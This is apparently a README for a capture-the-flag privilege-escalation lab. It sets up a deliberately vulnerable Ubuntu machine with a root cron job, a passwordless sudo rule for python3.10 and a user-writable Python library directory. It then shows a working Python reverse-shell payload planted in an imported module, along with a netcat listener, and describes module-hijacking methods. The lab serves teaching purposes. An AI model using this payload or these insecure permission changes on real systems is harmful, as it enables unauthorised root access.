# EncryptEdge RCSCTF

This repository contains details and code for the EncryptEdge RCSCTF Challenge No.3 Privilage Escalation part.

## Table of Contents
- [Introduction](#introduction)
- [Installation](#installation)
- [Usage](#usage)

## Introduction
This particular challenge is designed to showcase various Python libraries and demonstrate system administration tasks such as creating cron jobs and managing file permissions.

This challenge is based on the "Write Permissions on Imported Python Module"

We are intentionally giving the permissions of python library to user, And I have imported a custom library.

# Installation
> To get started with the challenge, follow these steps:

1. Clone the repository:
    ```shell
    git clone https://github.com/your-username/EncryptEdge-RCSCTF.git
    ```

2. Install the required Python libraries:
    ```
    pip install -r requirements.txt
    ```

# Usage

## Create a VM in any type-2 hyperviser 
> I used Ubuntu 22.04 LTS ISO image

> I used VMWare Workstation

## Checking Default Python Libraries
> To check the default Python libraries, run the following command:
```
python3 -c 'import sys; print("\n".join(sys.path))'
```
## Giving Least Privilages to user 

> I removed user from the "adm" and "sudo" groups

```sudo gpasswd -d (usernme) (groupname)```

## Viewing a particular user cronjob

```sudo crontab -l -u (username)```

## Create a System-wide Cronjob
> To create a system-wide cronjob that runs every 2 minutes, edit the /etc/crontab file:

```
sudo nano /etc/crontab
```

> Add the following line to run the Python script every 2 minutes:
```
*/2 * * * * /usr/bin/python3 /home/xavir/Fishy.py
```

## Editing Sudoers file 
> Open the sudoers file in a text editor with sudo privileges:

```sudo visudo```
> Add the following line at the end of the file:
```xavir ALL=(ALL) NOPASSWD: /usr/bin/python3.10```

> This will allow the user xavir to run /usr/bin/python3.10 as root without being asked for a password.

> Save the file and exit the text editor.

## Manage Access to Fishy.py
> To give only read access to Fishy.py to the user xavir, use the chmod and chown commands:

```
chown root:xavir /path/to/Fishy.py
chmod 640 /path/to/Fishy.py
```
## Manage access to custom python library
> To give only read and write access to demon.py to the user xavir, use the chmod and chown commands:

```
sudo chown -R xavir /usr/lib/python3.10
sudo chmod -R u+rw /usr/lib/python3.10
```

## View System-wide Cronjob
> To view the system-wide cronjob, use the following command:

```
cat /etc/crontab
```

## Implementing a Reverse Shell in Python 
> Editing custom library (i.e demon.py) which user has access to read and write and will upload the pyhton reverse shell

```nano /usr/lib/python3.10/demon.py```

```
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9001))
dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)
run(["/bin/bash", "-i"])
```
## Getting the reverse shell 
> Start a listner on the host machine 

```nc -lvnp (port)```

> As the cronjob is running continuosly we will get the rev shell as soon as possible when the script is runned and a hint text file named youneedme.txt will be created in the used home directory.

> As our Cronjob script is runned by sudo privilages, the payload is executed by sudo privilages and hence we will get the root shell.


## This Privilage Escalation has three methods 
> 1. Method 1 [Write Permissions]

A vulnerability in a Python script that is caused by the permissions of the module file being imported. When the imported module file has permissions that allow any user to edit, it becomes a vulnerability. To understand the background and the permissions that can lead to a privilege escalation, the vulnerability is created in an Ubuntu environment and then exploited using Kali Linux.

> 2. Method 2 [Priority Order]

A vulnerability in a Python script that is caused by the priority order of the Python Library path. When a module is imported in a script, Python searches for the module file inside the default directories in a particular priority order. If there exists a Python module file in the same directory as the original script, it will get priority over the default paths. To understand how this can lead to a privilege escalation, the vulnerability is created in an Ubuntu environment and then exploited using Kali Linux.

> 3. Method 3 [PYTHONPATH Environment Variable]

This vulnerability is based on the Python Library that is searching through the Python PATH Environment Variable. This variable holds a list of directories where the python searches for the different directories for the imported modules. If an attacker can change or modify that variable then they can use it to elevate privileges on the target machine. To get a better understanding of what goes in the background, how can it lead to a privilege escalation we will first create the vulnerability in our ubuntu environment and then use Kali Linux to exploit this vulnerability. 